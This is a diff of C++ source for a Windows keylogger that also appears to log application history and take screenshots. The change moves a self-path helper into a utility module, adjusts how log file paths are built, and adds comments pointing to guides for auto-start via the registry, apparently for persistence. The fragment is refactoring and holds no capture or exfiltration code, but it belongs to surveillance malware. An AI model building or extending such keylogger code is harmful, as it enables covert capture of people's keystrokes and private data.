@@ -2,6 +2,7 @@
 #include "Keylogger.h"
 #include "Application_History.h"
 #include "Screenshot.h"
+#include "Utility.h"
 
 #include <windows.h>
 #include <stdlib.h>
@@ -35,18 +36,6 @@ std::string Keylogger::intToString(int i)
 	char buffer[4];
 	_itoa_s(i, buffer, 4, 10);
 	return std::string(buffer);
-}
-
-std::string Keylogger::getSelfPath()
-{
-	char selfpath[MAX_PATH];
-	wchar_t selfpath_wchar[MAX_PATH];
-
-	GetModuleFileName(NULL, selfpath_wchar, MAX_PATH);
-	size_t pReturnValue;
-	wcstombs_s(&pReturnValue, selfpath, MAX_PATH, selfpath_wchar, MAX_PATH);
-
-	return std::string(selfpath);
 }
 
 std::string Keylogger::dirBasename(std::string path)
@@ -253,7 +242,8 @@ std::string Keylogger::create_file()
 	time(&rawtime);
 	localtime_s(&timeinfo, &rawtime);
 
-	std::string basepath = dirBasename(getSelfPath());
+	std::string application_path = utility::get_application_path();
+	std::string basepath = dirBasename(application_path);
 	char file_name[MAX_PATH];
 	char file_path[MAX_PATH];
 	strftime(file_name, 100, "%Y-%m-%d_%H-%M-%S", &timeinfo);
@@ -298,3 +288,6 @@ std::vector<std::string> get_keywords()
 
 	return keywords;
 }
+
+// https://stackoverflow.com/questions/557466/how-to-create-an-auto-startup-c-program
+// https://stackoverflow.com/questions/41317224/how-can-i-make-my-program-run-on-startup-by-adding-it-to-the-registry
